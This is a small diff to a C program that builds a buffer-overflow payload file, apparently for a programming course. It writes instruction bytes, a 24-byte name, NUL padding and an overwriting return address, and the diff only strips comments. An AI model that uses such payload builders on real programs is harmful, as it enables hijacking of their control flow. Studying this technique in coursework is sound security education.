@@ -43,13 +43,13 @@ int main(void)
     fwrite(&instr, 4, 1, psFile); 
     pc+=4; 
 
-    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);  // the 24-byte name
-    fputc(0, psFile);                                    // one NUL terminator
-    for (i = 0; i < 23; i++)                             // 23 more NULs for padding
+    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);  
+    fputc(0, psFile);                                    
+    for (i = 0; i < 23; i++)                             
         fputc(0, psFile);
 
     fwrite(&returnAddr, sizeof returnAddr, 1, psFile); 
-         
+
     fclose(psFile);
 
     return 0;
